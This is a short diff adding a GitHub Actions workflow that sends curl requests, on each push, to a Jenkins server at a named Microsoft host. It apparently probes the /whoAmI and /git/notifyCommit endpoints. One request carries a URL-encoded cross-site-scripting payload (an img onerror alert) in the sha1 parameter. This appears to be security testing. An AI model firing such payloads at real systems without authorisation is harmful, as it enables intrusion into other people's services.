@@ -1,0 +1,21 @@
+name: test
+
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+env:
+  TARGET: https://jenkins.cloudnet.microsoft.com
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: Accessing /whoAmI
+        run: curl --connect-timeout 10 -Lvk $TARGET/whoAmI/
+      - name: Accessing /git/notifyCommit with sha1 paramater
+        run: curl --connect-timeout 10 -Lvk "$TARGET/git/notifyCommit?url=https://github.com/microsoft/ValidREPO.git&sha1=Welcome%3Cimg%20src%3Dx%20onerror%3Dalert%281337%29%3E"
+      - name: Accessing /git/notifyCommit without sha1 paramater
+        run: curl --connect-timeout 10 -Lvk "$TARGET/git/notifyCommit?url=https://github.com/microsoft/ValidREPO.git"
